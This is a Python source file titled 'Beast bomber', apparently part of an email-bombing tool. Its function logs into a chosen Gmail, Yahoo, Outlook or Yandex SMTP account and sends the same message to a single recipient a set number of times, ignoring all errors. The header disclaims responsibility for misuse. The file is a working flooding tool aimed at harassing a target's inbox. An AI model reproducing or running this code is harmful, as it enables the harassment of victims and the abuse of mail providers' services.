"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                   Beast bomber                                  ║
║  Author:                                                                        ║
║  https://github.com/ebankoff                                                    ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                           Copyright (C) 2022 ebankoff                           ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""

import smtplib
import colorama
from email.utils import make_msgid
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


colorama.init()


def email(emails, passwords, to, amount, subj, mes, server):
	port = 0
	server2 = ''

	if server == '1':
		server = smtplib.SMTP('smtp.gmail.com', 587)
		port = 587
		server2 = 'smtp.gmail.com'
	elif server == '2':
		server = smtplib.SMTP('smtp.mail.yahoo.com', 587)
		port = 587
		server2 = 'smtp.mail.yahoo.com'
	elif server == '3':
		server = smtplib.SMTP('smtp-mail.outlook.com', 587)
		port = 587
		server2 = 'smtp-mail.outlook.com'
	elif server == '4':
		server = smtplib.SMTP('smtp.yandex.ru', 465)
		port = 465
		server2 = 'smtp.yandex.ru'

	for i in range(amount):
		try:
			msg = MIMEMultipart()
			msg['Message-ID'] = make_msgid()
			msg['From'] = emails
			msg['To'] = to
			msg['Subject'] = subj
			msg.attach(MIMEText(mes, 'plain'))

			server.connect(server2, port)
			server.starttls()
			server.login(msg['From'], passwords)
			server.sendmail(msg['From'], msg['To'], msg.as_string())
			server.quit()
		except:
			pass